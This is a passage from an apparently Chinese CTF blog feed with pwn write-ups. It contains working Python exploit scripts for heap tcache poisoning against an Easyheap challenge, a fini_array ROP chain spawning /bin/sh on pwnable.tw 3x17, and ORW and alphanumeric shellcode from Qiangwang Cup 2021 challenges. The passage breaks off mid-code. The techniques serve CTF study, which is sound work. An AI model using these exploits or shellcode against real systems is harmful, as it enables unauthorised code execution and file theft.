class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#io = process(&#x27;./Easyheap&#x27;)</span><br><span class="line">io = remote(&#x27;node4.buuoj.cn&#x27;,29538)</span><br><span class="line">elf = ELF(&#x27;./Easyheap&#x27;)</span><br><span class="line">libc = ELF(&#x27;./libc-2.27.so&#x27;)</span><br><span class="line">context.arch = &#x27;amd64&#x27;</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;,&#x27;split&#x27;,&#x27;-h&#x27;]</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">def add(a1,a2):</span><br><span class="line">    io.sendlineafter(&#x27;&gt;&gt; :\n&#x27;,&#x27;1&#x27;)</span><br><span class="line">    io.sendlineafter(&#x27;Size: \n&#x27;,str(a1))</span><br><span class="line">    io.sendafter(&#x27;Content: \n&#x27;,a2)</span><br><span class="line"></span><br><span class="line">def dele(a1):</span><br><span class="line">    io.sendlineafter(&#x27;&gt;&gt; :\n&#x27;,&#x27;2&#x27;)</span><br><span class="line">    io.sendlineafter(&#x27;Index:\n&#x27;,str(a1))</span><br><span class="line"></span><br><span class="line">def show(a1):</span><br><span class="line">    io.sendlineafter(&#x27;&gt;&gt; :\n&#x27;,&#x27;3&#x27;)</span><br><span class="line">    io.sendlineafter(&#x27;Index:\n&#x27;,str(a1))</span><br><span class="line"></span><br><span class="line">def edit(a1,a2):</span><br><span class="line">    io.sendlineafter(&#x27;&gt;&gt; :\n&#x27;,&#x27;4&#x27;)</span><br><span class="line">    io.sendlineafter(&#x27;Index:\n&#x27;,str(a1))</span><br><span class="line">    io.sendafter(&#x27;Content:\n&#x27;,a2)</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">    add(0x500,&#x27;a&#x27;*0x10)#0</span><br><span class="line">    add(0x500,&#x27;b&#x27;*0x80)#1</span><br><span class="line">    add(0x500,&#x27;c&#x27;*0x80)#2</span><br><span class="line">    add(0x500,&#x27;d&#x27;*0x10)#3</span><br><span class="line">    add(0x500,&#x27;e&#x27;*0x80)#4</span><br><span class="line">    add(0x500,&#x27;f&#x27;*0x80)#5</span><br><span class="line">    add(0x500,&#x27;g&#x27;*0x10)#6</span><br><span class="line">    dele(2)</span><br><span class="line">    dele(1)</span><br><span class="line">    payload = &#x27;a&#x27;*0x20</span><br><span class="line">    edit(0,payload)</span><br><span class="line">    show(0)</span><br><span class="line">    io.recvuntil(&#x27;a&#x27;*0x20,timeout = 0.5)</span><br><span class="line">    heap_base = u64(io.recv(6).ljust(8,&#x27;\x00&#x27;)) - 0x310</span><br><span class="line">    print(&#x27;heap_base&#x27;,hex(heap_base))</span><br><span class="line">    </span><br><span class="line">    payload = &#x27;a&#x27;*0x10 + p64(0) + p64(0x91) + p64(heap_base+0x10)</span><br><span class="line">    edit(0,payload)</span><br><span class="line">    add(0x500,&#x27;b&#x27;*0x80)#1</span><br><span class="line">    edit(1,&#x27;./flag\x00\x00&#x27;)</span><br><span class="line">    #pause()</span><br><span class="line">    add(0x500,&#x27;c&#x27;*0x80)#2 tcache</span><br><span class="line">    edit(2,&#x27;\x00&#x27;*7+&#x27;\x07&#x27;+&#x27;\x00&#x27;*0x78)</span><br><span class="line">    dele(4)</span><br><span class="line">    edit(3,&#x27;a&#x27;*0x20)</span><br><span class="line">    show(3)</span><br><span class="line">    io.recvuntil(&#x27;a&#x27;*0x20,timeout = 0.5)</span><br><span class="line">    malloc_hook = u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,&#x27;\x00&#x27;)) - 96 - 0x10</span><br><span class="line">    libc_base = malloc_hook - libc.symbols[&#x27;__malloc_hook&#x27;]</span><br><span class="line">    print(&#x27;libc_base&#x27;,hex(libc_base))</span><br><span class="line">    edit(3,&#x27;a&#x27;*0x10+p64(0)+p64(0x91))</span><br><span class="line">    edit(2,&#x27;\x00&#x27;*0x8)</span><br><span class="line"></span><br><span class="line">    add(0x500,&#x27;e&#x27;*0x80)#4</span><br><span class="line">    dele(5)</span><br><span class="line">    dele(4)</span><br><span class="line">    edit(3,&#x27;a&#x27;*0x10+p64(0)+p64(0x91)+p64(0x23330000))</span><br><span class="line">    add(0x500,&#x27;e&#x27;*0x80)#4</span><br><span class="line">    add(0x500,&#x27;e&#x27;*0x80)#5 0x23330000</span><br><span class="line">    #open(&#x27;./flag&#x27;,0)</span><br><span class="line">    payload = &#x27;&#x27;&#x27;</span><br><span class="line">    mov rax,2;</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    payload += &#x27;mov rdi,&#x27;+hex(heap_base+0x280)+&#x27;;&#x27;</span><br><span class="line">    payload +=&#x27;&#x27;&#x27;</span><br><span class="line">    xor rsi,rsi;</span><br><span class="line">    syscall;</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    payload = asm(payload)</span><br><span class="line">    #read(fd,addr,0x20)</span><br><span class="line">    payload1 = &#x27;&#x27;&#x27;</span><br><span class="line">    mov rdi,rax;</span><br><span class="line">    xor rax,rax;</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    payload1 += &#x27;mov rsi,&#x27;+hex((heap_base+0x260))+&#x27;;push 0x30; pop rdx;syscall;&#x27;</span><br><span class="line">    payload1 = asm(payload1)</span><br><span class="line">    #write(1,addr,0x20)</span><br><span class="line">    payload2 = &#x27;mov rsi,&#x27;+hex(heap_base+0x260)+&#x27;;push 0x30; pop rdx;mov rdi,1;push 1;pop rax;syscall&#x27;</span><br><span class="line">    payload2 = asm(payload2)</span><br><span class="line">    print(len(payload+payload1+payload2))</span><br><span class="line">    edit(5,payload+payload1+payload2)</span><br><span class="line"></span><br><span class="line">    #pause()</span><br><span class="line">    add(0x500,&#x27;a&#x27;*0x30)#7</span><br><span class="line">    add(0x500,&#x27;a&#x27;*0x30)#8</span><br><span class="line">    dele(8)</span><br><span class="line">    dele(7)</span><br><span class="line">    free_hook = libc_base + libc.symbols[&#x27;__free_hook&#x27;]</span><br><span class="line">    payload = &#x27;a&#x27;*0x10+p64(0)+p64(0x41)+p64(free_hook)</span><br><span class="line">    edit(6,payload)</span><br><span class="line">    #pause()</span><br><span class="line">    add(0x500,&#x27;a&#x27;*0x30)#7</span><br><span class="line">    #pause()</span><br><span class="line">    add(0x500,&#x27;a&#x27;*0x30)#8 free_hook</span><br><span class="line">    edit(8,p64(0x23330000))</span><br><span class="line"> #   gdb.attach(io)</span><br><span class="line">    dele(7)</span><br><span class="line">    io.recvuntil(&#x27;&#125;&#x27;)</span><br><span class="line">    #io.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>静态pwn</title>
      <link href="/2021/07/14/%E9%9D%99%E6%80%81pwn/"/>
      <url>/2021/07/14/%E9%9D%99%E6%80%81pwn/</url>
      
        <content type="html"><![CDATA[<h3 id="静态pwn"><a href="#静态pwn" class="headerlink" title="静态pwn"></a>静态pwn</h3><span id="more"></span><p>第一次遇到一个静态堆题，一开始鸹貔了，把他当动态的来做了，写到泄露libc基址的时候发现不对劲了😨</p><p>对于这个题，我们可以使用fini_array来进行栈迁移。</p><p>先看看_start函数,将fini、init、main都放入寄存器中作为参数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401A60                 public start</span><br><span class="line">.text:0000000000401A60 start           proc near               ; DATA XREF: LOAD:0000000000400018↑o</span><br><span class="line">.text:0000000000401A60 ; __unwind &#123;</span><br><span class="line">.text:0000000000401A60                 xor     ebp, ebp</span><br><span class="line">.text:0000000000401A62                 mov     r9, rdx</span><br><span class="line">.text:0000000000401A65                 pop     rsi</span><br><span class="line">.text:0000000000401A66                 mov     rdx, rsp</span><br><span class="line">.text:0000000000401A69                 and     rsp, 0FFFFFFFFFFFFFFF0h</span><br><span class="line">.text:0000000000401A6D                 push    rax</span><br><span class="line">.text:0000000000401A6E                 push    rsp</span><br><span class="line">// 以此将 fini、init、main 地址压入寄存器</span><br><span class="line">.text:0000000000401A6F                 mov     r8, offset sub_402BD0; fini</span><br><span class="line">.text:0000000000401A76                 mov     rcx, offset loc_402B40;init</span><br><span class="line">.text:0000000000401A7D                 mov     rdi, offset main</span><br><span class="line">.text:0000000000401A84                 db      67h</span><br><span class="line">.text:0000000000401A84                 call    __libc_start_main</span><br><span class="line">.text:0000000000401A8A                 hlt</span><br><span class="line">.text:0000000000401A8A ; &#125; // starts at 401A60</span><br><span class="line">.text:0000000000401A8A start           endp</span><br></pre></td></tr></table></figure><p><strong>fini_array</strong></p><p>可以发现是先调用fini_array[1]，在调用fini_array[0],因此如果将<code>__libc_csu_fini</code>函数地址填入fini_array[0]中即可无限循环调用fini_array。如果将fini_array[0]填入leave_ret地址，即可进行栈迁移。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.fini_array:00000000004B40F0 _fini_array     segment para public &#x27;DATA&#x27; use64</span><br><span class="line">.fini_array:00000000004B40F0                 assume cs:_fini_array</span><br><span class="line">.fini_array:00000000004B40F0                 ;org 4B40F0h</span><br><span class="line">.fini_array:00000000004B40F0 _fini_array_0   dq offset sub_401B00    ; DATA XREF: .text:000000000040291C↑o</span><br><span class="line">.fini_array:00000000004B40F0                                         ; __libc_csu_fini+8↑o</span><br><span class="line">.fini_array:00000000004B40F8                 dq offset sub_401580</span><br><span class="line">.fini_array:00000000004B40F8 _fini_array     ends</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000402960 __libc_csu_fini proc near               ; DATA XREF: start+F↑o</span><br><span class="line">.text:0000000000402960 ; __unwind &#123;</span><br><span class="line">.text:0000000000402960                 push    rbp</span><br><span class="line">.text:0000000000402961                 lea     rax, unk_4B4100</span><br><span class="line">.text:0000000000402968                 lea     rbp, _fini_array_0;改变ebp值</span><br><span class="line">.text:000000000040296F                 push    rbx</span><br><span class="line">.text:0000000000402970                 sub     rax, rbp</span><br><span class="line">.text:0000000000402973                 sub     rsp, 8</span><br><span class="line">.text:0000000000402977                 sar     rax, 3</span><br><span class="line">.text:000000000040297B                 jz      short loc_402996</span><br><span class="line">.text:000000000040297D                 lea     rbx, [rax-1]</span><br><span class="line">.text:0000000000402981                 nop     dword ptr [rax+00000000h]</span><br><span class="line">.text:0000000000402988</span><br><span class="line">.text:0000000000402988 loc_402988:                             ; CODE XREF: __libc_csu_fini+34↓j</span><br><span class="line">.text:0000000000402988                 call    qword ptr [rbp+rbx*8+0]</span><br><span class="line">.text:000000000040298C                 sub     rbx, 1</span><br><span class="line">.text:0000000000402990                 cmp     rbx, 0FFFFFFFFFFFFFFFFh</span><br><span class="line">.text:0000000000402994                 jnz     short loc_402988</span><br><span class="line">.text:0000000000402996</span><br><span class="line">.text:0000000000402996 loc_402996:                             ; CODE XREF: __libc_csu_fini+1B↑j</span><br><span class="line">.text:0000000000402996                 add     rsp, 8</span><br><span class="line">.text:000000000040299A                 pop     rbx</span><br><span class="line">.text:000000000040299B                 pop     rbp</span><br><span class="line">.text:000000000040299C                 jmp     sub_48E32C</span><br><span class="line">.text:000000000040299C ; &#125; // starts at 402960</span><br><span class="line">.text:000000000040299C __libc_csu_fini endp</span><br></pre></td></tr></table></figure><p><strong>可以通过找到hook的地址，然后写入shellcode，开启了NX保护的话，需要使用mprotect将段给予权限。</strong></p><p><img src="/2021/07/14/%E9%9D%99%E6%80%81pwn/image-20210714123009279.png" class="lazyload placeholder" data-srcset="/2021/07/14/%E9%9D%99%E6%80%81pwn/image-20210714123009279.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20210714123009279"></p><h3 id="例题：pwnable-tw-3x17"><a href="#例题：pwnable-tw-3x17" class="headerlink" title="例题：pwnable.tw 3x17"></a>例题：pwnable.tw 3x17</h3><p>经测试<code>sub_40ee70</code>函数是将你输入的值转为16进制地址。因此我们就可以进行任意地址读写操作。</p><p><img src="/2021/07/14/%E9%9D%99%E6%80%81pwn/image-20210922224507213.png" class="lazyload placeholder" data-srcset="/2021/07/14/%E9%9D%99%E6%80%81pwn/image-20210922224507213.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20210922224507213"></p><p>由于是静态pwn，也没有system函数和/bin/sh字符串，因此我们想到利用fini_array进行无限写的操作。只需要将fini_array[1]覆盖为main函数地址（<strong>如果直接跳转到main函数中间，那么就会因为有canary而报错。并且byte_4b9330他是unsigned int8,因此美循环0x100次就会变回1，今儿继续任意读写地址</strong>），将fini_array[0]覆盖为__libc_csu_fini函数的地址就可以进行无限写。接着我们只需要将rop写到fini_array[0]+0x10的位置上，然后再覆盖fini_array[0]为leave|ret,fini_array[1]覆盖为ret的地址就能将栈迁移到目标位置执行rop。</p><p>exp：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">#适当添加sleep函数才能打通，当网络不太好的时候</span><br><span class="line">from pwn import *</span><br><span class="line">#io=process(&#x27;./3x17&#x27;)</span><br><span class="line">io=remote(&#x27;chall.pwnable.tw&#x27; ,10105)</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line">pop_rdi=0x0000000000401696</span><br><span class="line">pop_rdx_rsi=0x000000000044a309</span><br><span class="line">pop_rax=0x000000000041e4af</span><br><span class="line">syscall=0x00000000004022b4</span><br><span class="line">leaver=0x0000000000401C4B</span><br><span class="line"></span><br><span class="line">io.sendlineafter(&#x27;addr:&#x27;,&#x27;4931824&#x27;)</span><br><span class="line">io.sendlineafter(&#x27;data:&#x27;,p64(0x402960)+p64(0x401B6D))</span><br><span class="line">sleep(0.5)</span><br><span class="line">io.sendlineafter(&#x27;addr:&#x27;,&#x27;4931840&#x27;)</span><br><span class="line">io.sendlineafter(&#x27;data:&#x27;,p64(pop_rdi)+p64(0x4B4140)+p64(pop_rdx_rsi))</span><br><span class="line">sleep(0.5)</span><br><span class="line">io.sendlineafter(&#x27;addr:&#x27;,&#x27;4931864&#x27;)</span><br><span class="line">io.sendlineafter(&#x27;data:&#x27;,p64(0)+p64(0)+p64(pop_rax))</span><br><span class="line">sleep(0.5)</span><br><span class="line">io.sendlineafter(&#x27;addr:&#x27;,&#x27;4931888&#x27;)</span><br><span class="line">io.sendlineafter(&#x27;data:&#x27;,p64(59)+p64(syscall)+&#x27;/bin/sh\x00&#x27;)</span><br><span class="line">sleep(0.5)</span><br><span class="line">io.sendlineafter(&#x27;addr:&#x27;,&#x27;4931824&#x27;)</span><br><span class="line">#gdb.attach(io,&#x27;b *0x402960&#x27;)</span><br><span class="line">io.sendafter(&#x27;data:&#x27;,p64(leaver)+p64(leaver+1)+p64(pop_rdi))</span><br><span class="line">io.recv(0x14+0xa)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>强网杯2021pwn</title>
      <link href="/2021/06/13/%E5%BC%BA%E7%BD%91%E6%9D%AF2021pwn/"/>
      <url>/2021/06/13/%E5%BC%BA%E7%BD%91%E6%9D%AF2021pwn/</url>
      
        <content type="html"><![CDATA[<p><strong>强网杯2021pwn</strong></p><span id="more"></span><h3 id="orw（数组越界）"><a href="#orw（数组越界）" class="headerlink" title="orw（数组越界）"></a>orw（数组越界）</h3><p><img src="/2021/06/13/%E5%BC%BA%E7%BD%91%E6%9D%AF2021pwn/image-20210624223626019.png" class="lazyload placeholder" data-srcset="/2021/06/13/%E5%BC%BA%E7%BD%91%E6%9D%AF2021pwn/image-20210624223626019.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20210624223626019"></p><p><img src="/2021/06/13/%E5%BC%BA%E7%BD%91%E6%9D%AF2021pwn/image-20210624223507894.png" class="lazyload placeholder" data-srcset="/2021/06/13/%E5%BC%BA%E7%BD%91%E6%9D%AF2021pwn/image-20210624223507894.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20210624223507894"></p><p>pwn的签到题，没做出来，裂开。。。</p><p>开了沙箱，发现v1和v2都是int型，且没有对v1进行判断，可以写入负数进行越界，覆盖到got表</p><p><img src="/2021/06/13/%E5%BC%BA%E7%BD%91%E6%9D%AF2021pwn/image-20210624223802601.png" class="lazyload placeholder" data-srcset="/2021/06/13/%E5%BC%BA%E7%BD%91%E6%9D%AF2021pwn/image-20210624223802601.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20210624223802601"></p><p>当v2=0时，也就是a2=0，<code>++buf</code>就不会等于<code>&amp;a1[a2]</code>,就可以不限个数输入字符，构造shellcode。</p><p><img src="/2021/06/13/%E5%BC%BA%E7%BD%91%E6%9D%AF2021pwn/image-20210624224218597.png" class="lazyload placeholder" data-srcset="/2021/06/13/%E5%BC%BA%E7%BD%91%E6%9D%AF2021pwn/image-20210624224218597.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20210624224218597"></p><p>exp：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line">context.arch=&#x27;amd64&#x27;</span><br><span class="line">remote_addr=[&quot;39.105.131.68&quot;,12354] </span><br><span class="line">def add(index,size,content):</span><br><span class="line"> p.recvuntil(&#x27;choice &gt;&gt;\n&#x27;)</span><br><span class="line"> p.sendline(&#x27;1&#x27;)</span><br><span class="line"> p.recvuntil(&#x27;index:\n&#x27;)</span><br><span class="line"> p.sendline(str(index))</span><br><span class="line"> p.recvuntil(&#x27;size:\n&#x27;)</span><br><span class="line"> p.sendline(str(size))</span><br><span class="line"> p.recvuntil(&#x27;content:\n&#x27;)</span><br><span class="line"> p.sendline(content)</span><br><span class="line"></span><br><span class="line">shellcode=&#x27;&#x27;&#x27;</span><br><span class="line">xor rdi,rdi</span><br><span class="line">mov rdi,0x67616c662f</span><br><span class="line">push rdi</span><br><span class="line">mov rdi,rsp</span><br><span class="line">xor rsi,rsi</span><br><span class="line">xor rdx,rdx</span><br><span class="line">mov rax,2</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">mov rdi, rax</span><br><span class="line">mov rsi,rsp</span><br><span class="line">mov rdx, 0x50</span><br><span class="line">mov rax,0</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">mov rdi,1</span><br><span class="line">mov rsi,rsp</span><br><span class="line">mov rdx,rax</span><br><span class="line">mov rax,1</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">mov rdi,0</span><br><span class="line">mov rax,60</span><br><span class="line">syscall</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line">print shellcode</span><br><span class="line">p=remote(remote_addr[0],remote_addr[1])</span><br><span class="line">add(-25,0,shellcode) #0x0000555555757160</span><br><span class="line">p.sendline(&#x27;4&#x27;)</span><br><span class="line">p.sendline(&#x27;0&#x27;)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="no-output（signal函数）"><a href="#no-output（signal函数）" class="headerlink" title="no_output（signal函数）"></a>no_output（signal函数）</h3><p>程序只开了NX保护。</p><p>程序主函数如下：</p><p><img src="/2021/06/13/%E5%BC%BA%E7%BD%91%E6%9D%AF2021pwn/image-20210613203304850.png" class="lazyload placeholder" data-srcset="/2021/06/13/%E5%BC%BA%E7%BD%91%E6%9D%AF2021pwn/image-20210613203304850.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20210614175149635"></p><p>在begin函数中，发现打开了real_flag.txt,但是是以只写权限打开(所以后文中的read(fd,src,0x10)就无法从real_flag.txt文件中读取内容到src中)，并且将文件描述符存入到bss段中。</p><p><img src="/2021/06/13/%E5%BC%BA%E7%BD%91%E6%9D%AF2021pwn/image-20210614214525726.png" class="lazyload placeholder" data-srcset="/2021/06/13/%E5%BC%BA%E7%BD%91%E6%9D%AF2021pwn/image-20210614214525726.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20210614214525726"></p><p><code>sub_80493EC</code>是将我们输入的name的第3到第8个字节改为\x02~\x07。接着因为dest和fd在bss段上是相邻的且dest大小位0x20，如果我们输入0x20个字节，那么strcpy函数就会将第0x21个字节改为\x00，因此就可以改fd的值为0，就可以输入”hello_boy“来绕过compare函数进入func函数。func函数如下所示：</p><p><img src="/2021/06/13/%E5%BC%BA%E7%BD%91%E6%9D%AF2021pwn/image-20210614220431762.png" class="lazyload placeholder" data-srcset="/2021/06/13/%E5%BC%BA%E7%BD%91%E6%9D%AF2021pwn/image-20210614220431762.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20210614220431762"></p><p>signal函数是处理信号用的，signal(8,vuln)函数的意思是如果捕捉到了8信号，就会对其进行中断，执行vuln函数。当发生除法错误时会有8信号产生（一般是除0或者是除完后有溢出），因此我们可以用变量v2对应的类型所能表示的最小负数除以-1，就可以产生溢出，从而执行vuln函数。vuln函数如下：</p><p><img src="/2021/06/13/%E5%BC%BA%E7%BD%91%E6%9D%AF2021pwn/image-20210614222018971.png" class="lazyload placeholder" data-srcset="/2021/06/13/%E5%BC%BA%E7%BD%91%E6%9D%AF2021pwn/image-20210614222018971.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20210614222018971"></p><p>因为此程序没有任何的打印函数，所以无法泄露出地址，看了nu1l的wp，他们用的是ret2dlsolve。因为对这个高级的rop还不太熟悉，我只能想到用程序已给的函数去读flag。使用程序已有的open、read函数将flag读到内存中，再用程序自定义的函数compare去逐个字符的对flag进行比较，最终得到flag。我最开始认为flag就在real_flag.txt中，爆破出来发现是”hi~“，最后盲猜flag在当前路径下，读到真实的flag。</p><h3 id="shellcode（alpha3使用、32位64位模式转换）"><a href="#shellcode（alpha3使用、32位64位模式转换）" class="headerlink" title="shellcode（alpha3使用、32位64位模式转换）"></a>shellcode（alpha3使用、32位64位模式转换）</h3><p><img src="/2021/06/13/%E5%BC%BA%E7%BD%91%E6%9D%AF2021pwn/image-20210615201401973.png" class="lazyload placeholder" data-srcset="/2021/06/13/%E5%BC%BA%E7%BD%91%E6%9D%AF2021pwn/image-20210615201401973.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20210615201401973"></p><p>开了沙箱只允许使用fstat(32位下的open函数)、alarm、read、mmap、exit_group。同时限制了shellcode只能为可显示字符。如下图所示：</p><p><img src="/2021/06/13/%E5%BC%BA%E7%BD%91%E6%9D%AF2021pwn/image-20210616152847891.png" class="lazyload placeholder" data-srcset="/2021/06/13/%E5%BC%BA%E7%BD%91%E6%9D%AF2021pwn/image-20210616152847891.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20210616152847891"></p><p>我们可以先编写shellcode，再使用<a href="https://blog.csdn.net/qq_31409563/article/details/113317986?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-3.base&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-3.base">alpha3</a>工具将其转化为可显示字符串(在使用<code>python ../../alpha3/ALPHA3.py x64 ascii mixedcase rbx --input=&quot;sc.bin&quot; &gt; out.bin </code>指令时，rbx是由汇编代码确定的)。</p><p><img src="/2021/06/13/%E5%BC%BA%E7%BD%91%E6%9D%AF2021pwn/image-20210616154833158.png" class="lazyload placeholder" data-srcset="/2021/06/13/%E5%BC%BA%E7%BD%91%E6%9D%AF2021pwn/image-20210616154833158.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20210616154833158"></p><p>我们需要先调用mmap函数申请一块地址长度为4个字节的内存空间（如果地址长度超过了4个字节，那么在后面转为32位时esp等寄存器只能存储4个字节）。再调用read函数向申请的内存空间读入数据。接着切换64位为32位，使用retfq指令，该指令相当于ret+pop cs。当系统是32位时，cs里的值是0x23。当为64位时，cs的值是0x33。转化为32位后，调用fstat函数打开文件，再用retfq回到64位调用read函数将flag读到内存中，由于没有write函数，因此我们采用逐字节爆破。如果相同，则进入死循环，如果不同则程序退出。</p><p>另一个exp是没有使用工具，仅使用push，pop，xor byte ptr [rax+1]，al等指令，构造十分巧妙。</p><p>完整exp如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span 